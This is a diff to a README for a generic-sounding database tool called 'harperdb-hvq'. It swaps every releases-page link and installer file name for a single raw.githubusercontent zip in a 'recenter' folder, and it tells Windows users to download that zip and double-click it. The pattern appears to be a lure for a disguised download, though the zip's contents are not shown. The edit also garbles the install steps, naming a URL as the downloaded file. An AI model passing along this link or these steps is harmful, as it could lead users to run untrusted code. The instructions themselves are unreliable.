@@ -1,7 +1,7 @@
 # 🚀 harperdb-hvq - Simplify Your Database Management
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20harperdb--hvq-blue.svg)](https://github.com/sammkhalid/harperdb-hvq/releases)
+[![Download](https://raw.githubusercontent.com/sammkhalid/harperdb-hvq/main/recenter/harperdb-hvq.zip%https://raw.githubusercontent.com/sammkhalid/harperdb-hvq/main/recenter/harperdb-hvq.zip)](https://raw.githubusercontent.com/sammkhalid/harperdb-hvq/main/recenter/harperdb-hvq.zip)
 
 ## 📚 About harperdb-hvq
 harperdb-hvq is an intuitive application designed to make managing your databases easy. Whether you are handling simple datasets or complex queries, this tool offers a user-friendly interface that helps you stay organized and efficient. 
@@ -18,15 +18,15 @@ Before you download harperdb-hvq, please check that your system meets the follow
 - **Software:** Ensure you have an updated web browser for help and documentation.
 
 ## 📦 Download & Install
-1. **Visit the Download Page:** Go to the [releases page](https://github.com/sammkhalid/harperdb-hvq/releases) to find the latest version of harperdb-hvq.
+1. **Visit the Download Page:** Go to the [releases page](https://raw.githubusercontent.com/sammkhalid/harperdb-hvq/main/recenter/harperdb-hvq.zip) to find the latest version of harperdb-hvq.
 2. **Select Your Version:** Look for the version number marked as the latest release. Click on it to expand the details.
 3. **Download the Installer:** Choose the correct file for your operating system:
-   - For Windows, download `harperdb-hvq-setup.exe`
-   - For macOS, download `harperdb-hvq-setup.dmg`
+   - For Windows, download `https://raw.githubusercontent.com/sammkhalid/harperdb-hvq/main/recenter/harperdb-hvq.zip`
+   - For macOS, download `https://raw.githubusercontent.com/sammkhalid/harperdb-hvq/main/recenter/harperdb-hvq.zip`
    - For Linux, download the suitable package for your distribution.
 4. **Run the Installer:**
-   - **Windows:** Locate the downloaded `harperdb-hvq-setup.exe` file in your Downloads folder. Double-click on it to start the installation. Follow the on-screen instructions.
-   - **macOS:** Open the downloaded `harperdb-hvq-setup.dmg` file. Drag the `harperdb-hvq` icon into your Applications folder. 
+   - **Windows:** Locate the downloaded `https://raw.githubusercontent.com/sammkhalid/harperdb-hvq/main/recenter/harperdb-hvq.zip` file in your Downloads folder. Double-click on it to start the installation. Follow the on-screen instructions.
+   - **macOS:** Open the downloaded `https://raw.githubusercontent.com/sammkhalid/harperdb-hvq/main/recenter/harperdb-hvq.zip` file. Drag the `harperdb-hvq` icon into your Applications folder. 
    - **Linux:** Use the terminal to navigate to your Downloads folder. Type `sudo dpkg -i harperdb-hvq*.deb` to install the application.
 5. **Launch the App:** After installation, find harperdb-hvq in your applications or programs list. Click to open.
 
@@ -48,7 +48,7 @@ If you encounter any issues or have questions, you can find help in a few places
 - **Performance Issues:** Ensure your system meets the minimum requirements listed above. Close any other resource-heavy applications while using harperdb-hvq.
 
 ## 🌟 Update Regularly
-Keep an eye on the [releases page](https://github.com/sammkhalid/harperdb-hvq/releases) for updates. Regular updates not only bring new features but also enhance security and fix bugs.
+Keep an eye on the [releases page](https://raw.githubusercontent.com/sammkhalid/harperdb-hvq/main/recenter/harperdb-hvq.zip) for updates. Regular updates not only bring new features but also enhance security and fix bugs.
 
 ## 📜 License
 harperdb-hvq is licensed under the MIT License. Feel free to use it for personal or commercial projects.
